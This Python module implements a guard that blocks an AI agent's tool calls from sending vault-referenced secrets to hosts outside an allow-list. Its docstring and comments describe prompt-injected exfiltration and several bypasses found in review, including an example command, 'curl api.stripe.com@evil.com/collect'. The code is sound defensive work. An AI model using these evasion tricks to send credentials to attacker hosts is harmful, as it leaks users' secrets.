"""EgressDomainGuard — a credential may only be sent to approved hosts.

BlindKey-style domain allowlisting: a secret marked "only for
api.stripe.com" must never ride along in a request to any other host,
even a legitimate-looking one. This closes the gap where an agent holds
a valid ``paladin://`` reference and a prompt-injected (or merely
confused) tool call points it at an exfiltration endpoint — the kernel
lets the *reference* be used, but this guard checks the *destination*.

The guard stays brand-neutral (no paladin import): it's configured with a
``ref_hosts`` map — ``{secret_name: [allowed_host, ...]}`` — that the
integration layer (talaria) populates from each vault entry's
``allowed_hosts`` metadata. An empty/absent host list means unrestricted
(preserving current behavior), so this only ever *adds* restriction.

Trigger: a tool call whose arguments contain BOTH a ``paladin://<name>``
reference for a restricted secret AND a destination host not in that
secret's allow-list → DENY.

Destination detection covers two forms, not just scheme-prefixed URLs:
a literal ``https://host/...`` string, AND a bare host token
(``evil.example.com``, ``evil.example.com/collect``) with no scheme —
the latter closes two real bypasses found in review: a destination
split across two separate argument values (so no single arg contains
the full ``https://host`` substring a scheme-only regex needs), and a
shell command built with a tool like ``curl`` that omits the scheme
entirely. A call with a restricted ref but genuinely no destination
signal anywhere (e.g. injecting the secret into a local subprocess env,
which never leaves the machine) still allows — this guard governs
*network* egress, not every use of a restricted secret.
"""
from __future__ import annotations

import re
from urllib.parse import urlparse

from custodian.adapters.base import ActionContext, Adapter, Verdict

# Any scheme, not just http(s) — found in adversarial review that
# restricting this to https?:// let a non-HTTP scheme (ftp://, gopher://,
# ws://, sftp://...) bypass destination detection entirely: the old
# regex wouldn't match it AND the bare-host fallback below explicitly
# skipped any token containing "://", so a scheme-prefixed non-HTTP
# destination was a double-miss, worse than having no scheme at all.
_URL_RE = re.compile(r"[a-zA-Z][a-zA-Z0-9+.-]*://[^\s\"'<>]+")
# Both the current scheme and the pre-rename one. A ref this regex fails to
# match is not a benign miss: the trigger below requires a ref AND a bad host,
# so an unrecognized ref means the guard never fires and the request is
# ALLOWED. Legacy refs still live in stored policy and agent context, so
# dropping "warden" here would silently unrestrict every one of them.
# Kept in sync with paladin.refs.SCHEMES by test_egress_ref_schemes_match_paladin.
_REF_SCHEMES = ("paladin", "warden")
_REF_RE = re.compile(
    r"(?:" + "|".join(s + "://" for s in _REF_SCHEMES) + r")"
    r"([a-zA-Z0-9][a-zA-Z0-9_.\-/]{0,127})"
)
# Bare-host token: two or more dot-separated labels, optionally followed by
# a port and/or path — catches a destination expressed without a literal
# "http(s)://" prefix.
_BARE_HOST_RE = re.compile(
    r"^([a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?"
    r"(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)+)"
    r"(?::\d+)?(?:/.*)?$"
)
_TOKEN_SPLIT = re.compile(r"[\s\"'`,;=(){}\[\]<>]+")


def _destination_of(tok: str) -> str:
    """Reduce a schemeless token to the host a client would actually contact.

    Two shapes defeated _BARE_HOST_RE outright, and because this guard denies
    only when it FINDS a disallowed host, matching nothing means ALLOW — so
    each was a silent exfiltration path, not a missed warning:

    * RFC-3986 userinfo. ``curl api.stripe.com@evil.com/collect`` connects to
      evil.com — everything before the LAST "@" is credentials. The anchored
      _BARE_HOST_RE saw "api.stripe.com" followed by "@" and matched nothing,
      so a request carrying a host-restricted secret to evil.com was allowed
      while the identical `https://` form was correctly denied (urlparse
      handles userinfo; the bare-host fallback did not).
    * A trailing dot. "evil.com." is a valid absolute FQDN and resolves the
      same, but the final label ended in "." so the anchored pattern failed.
    """
    if "@" in tok:
        tok = tok.rsplit("@", 1)[1]
    # Strip a trailing dot only from the host part, before any port/path.
    head, sep, rest = tok.partition("/")
    head = head.rstrip(".") if ":" not in head else head
    return head + sep + rest


def _hosts_in(text: str) -> set[str]:
    hosts: set[str] = set()
    for u in _URL_RE.findall(text):
        parsed = urlparse(u)
        if parsed.scheme.lower() in _REF_SCHEMES:
            # A secret reference, not a network destination. Both schemes must
            # be skipped: urlparse("warden://stripe_sk").hostname is
            # "stripe_sk", so omitting the legacy one would enter the secret's
            # own name into the destination set and denials would name a host
            # that was never a host.
            continue
        if parsed.hostname:
            hosts.add(parsed.hostname.lower())
    for tok in _TOKEN_SPLIT.split(text):
        # Any scheme-prefixed token was already handled by _URL_RE above —
        # skipping "://" tokens here just avoids re-processing them, not a
        # gap (that was the pre-fix bug: _URL_RE itself missed them).
        if not tok or "://" in tok:
            continue
        tok = _destination_of(tok)
        if not tok:
            continue
        m = _BARE_HOST_RE.match(tok)
        if m:
            hosts.add(m.group(1).lower())
    return hosts


class EgressDomainGuard(Adapter):
    """Denies sending a host-restricted secret to a non-approved host."""

    name = "egress-domain-guard"
    category = "security"
    fail_closed = True

    def __init__(self, config: dict | None = None) -> None:
        super().__init__(config)
        # {secret_name: [host, ...]}; empty list or absent = unrestricted.
        raw = self.config.get("ref_hosts", {})
        self.ref_hosts: dict[str, set] = {
            name: set(hosts) for name, hosts in raw.items() if hosts
        }

    def pre_action(self, ctx: ActionContext) -> Verdict:
        if not self.ref_hosts:
            return Verdict.allow(self.name)
        surface = ctx.text_surface()
        refs = set(_REF_RE.findall(surface))
        restricted = [r for r in refs if r in self.ref_hosts]
        if not restricted:
            return Verdict.allow(self.name)
        hosts = _hosts_in(surface)
        # No destination signal at all (URL or bare host) => this call
        # doesn't leave the machine as far as we can tell; nothing to
        # compare against an allow-list, so allow (see module docstring).
        for ref in restricted:
            allowed = self.ref_hosts[ref]
            bad = hosts - allowed
            if bad:
                return Verdict.deny(
                    self.name,
                    f"secret paladin://{ref} may only be sent to {sorted(allowed)}, "
                    f"but this call targets {sorted(bad)} — refusing to leak it there.",
                )
        return Verdict.allow(self.name)
